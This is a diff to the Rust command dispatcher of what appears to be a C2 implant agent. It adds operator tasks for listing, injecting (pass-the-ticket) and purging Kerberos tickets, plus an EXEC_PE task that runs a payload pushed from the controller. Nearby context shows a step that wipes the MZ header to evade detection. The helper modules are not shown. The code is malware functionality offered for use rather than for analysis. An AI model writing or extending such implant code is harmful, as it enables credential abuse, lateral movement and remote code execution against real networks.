@@ -1,4 +1,12 @@
 /// Command dispatcher — full task parity with the Go/Nim agents.
+
+// Declare sibling source files via explicit path so main.rs stays untouched.
+// Rust resolves #[path] relative to the directory of the declaring file (src/).
+#[path = "kerberos.rs"]
+mod kerberos;
+#[path = "pe_exec.rs"]
+mod pe_exec;
+
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
 use std::process::Command;
@@ -635,6 +643,34 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                     "[+] MZ header wiped".to_string()
                 }
             };
+            t.send_result(task.id, &r, "");
+        }
+        "KERB_LIST" => {
+            let r = kerberos::kerb_list_tickets();
+            t.send_result(task.id, &r, "");
+        }
+        "KERB_PTT" => {
+            let b64 = serde_json::from_str::<serde_json::Value>(&task.args)
+                .ok()
+                .and_then(|v| v.get("ticket").and_then(|t| t.as_str()).map(String::from))
+                .unwrap_or_default();
+            if b64.is_empty() {
+                t.send_result(task.id, "", "KERB_PTT requires {\"ticket\":\"<b64>\"}");
+                return;
+            }
+            let r = kerberos::kerb_pass_ticket(&b64);
+            t.send_result(task.id, &r, "");
+        }
+        "KERB_PURGE" => {
+            let r = kerberos::kerb_purge();
+            t.send_result(task.id, &r, "");
+        }
+        "EXEC_PE" => {
+            if task.payload.is_empty() {
+                t.send_result(task.id, "", "EXEC_PE requires a PE payload");
+                return;
+            }
+            let r = pe_exec::exec_pe(&task.payload);
             t.send_result(task.id, &r, "");
         }
         _ => {
